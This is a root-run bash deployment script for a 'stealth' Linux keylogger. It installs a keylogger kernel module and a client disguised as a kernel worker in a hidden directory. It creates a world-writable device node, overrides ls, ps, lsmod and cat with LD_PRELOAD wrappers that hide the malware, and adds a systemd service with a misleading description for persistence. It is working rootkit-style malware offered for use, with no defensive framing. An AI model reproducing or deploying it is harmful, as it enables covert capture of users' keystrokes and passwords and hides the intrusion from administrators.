#!/bin/bash

# ==========================================
# Linux Stealth Keylogger - Setup Script
# ==========================================

# 1. Check for root privileges
if [ "$EUID" -ne 0 ]; then
    echo "[-] Error: This script must be run as root (sudo)." >&2
    exit 1
fi

echo "[+] Starting stealth deployment..."

# Directories & Paths
HIDDEN_DIR="/usr/local/.system_data"
INSTALL_LIB="/lib/hider.so"

# 2. Create hidden directory
if [ ! -d "$HIDDEN_DIR" ]; then
    mkdir -p "$HIDDEN_DIR"
    echo "[+] Created hidden directory: $HIDDEN_DIR"
fi

# 3. Move and Masquerade binaries & modules
cp keylogger.ko "$HIDDEN_DIR/sys_mod.ko"
cp client "$HIDDEN_DIR/kworker_d"  # Masquerade client as a kernel worker thread
cp stealth_hook.so "$INSTALL_LIB"
chmod 755 "$INSTALL_LIB"

echo "[+] Binaries successfully masqueraded and moved."

# 4. Load Kernel Module and Create Device Node
if ! grep -q "keylogger" /proc/devices; then
    if [ -f "$HIDDEN_DIR/sys_mod.ko" ]; then
        /sbin/insmod "$HIDDEN_DIR/sys_mod.ko" > /dev/null 2>&1
    fi
fi

sleep 1

MAJOR=$(awk '$2=="keylogger" {print $1}' /proc/devices)
if [ -n "$MAJOR" ]; then
    rm -f /dev/keylogger
    mknod /dev/keylogger c $MAJOR 0
    chmod 666 /dev/keylogger
    echo "[+] Kernel module loaded and device node created (/dev/keylogger, Major: $MAJOR)."
else
    echo "[-] Warning: Could not retrieve Major number for keylogger device."
fi

# 5. Create Global Command Wrappers (LD_PRELOAD)
echo "[+] Setting up global command wrappers..."

cat << 'EOF' > /usr/local/bin/ls
#!/bin/bash
LD_PRELOAD=/lib/hider.so /bin/ls "$@"
EOF

cat << 'EOF' > /usr/local/bin/ps
#!/bin/bash
LD_PRELOAD=/lib/hider.so /bin/ps "$@"
EOF

cat << 'EOF' > /usr/local/bin/lsmod
#!/bin/bash
LD_PRELOAD=/lib/hider.so /sbin/lsmod "$@"
EOF

cat << 'EOF' > /usr/local/bin/cat
#!/bin/bash
LD_PRELOAD=/lib/hider.so /bin/cat "$@"
EOF

chmod +x /usr/local/bin/ls
chmod +x /usr/local/bin/ps
chmod +x /usr/local/bin/lsmod
chmod +x /usr/local/bin/cat

# 6. Register Systemd Service for Persistence
echo "[+] Registering Systemd persistence service..."

cat << EOF > /etc/systemd/system/keylogger.service
[Unit]
Description=Linux Kernel Event Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=$HIDDEN_DIR/kworker_d
Environment=LD_PRELOAD=$INSTALL_LIB
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable keylogger.service > /dev/null 2>&1

# 7. Run the client immediately via stealth hook
killall -9 kworker_d > /dev/null 2>&1
if [ -x "$HIDDEN_DIR/kworker_d" ]; then
    LD_PRELOAD="$INSTALL_LIB" "$HIDDEN_DIR/kworker_d" > /dev/null 2>&1 &
    echo "[+] Client daemon started successfully under stealth mode."
fi

echo "=================================================="
echo "[+] Stealth setup and execution complete!"
echo "=================================================="
exit 0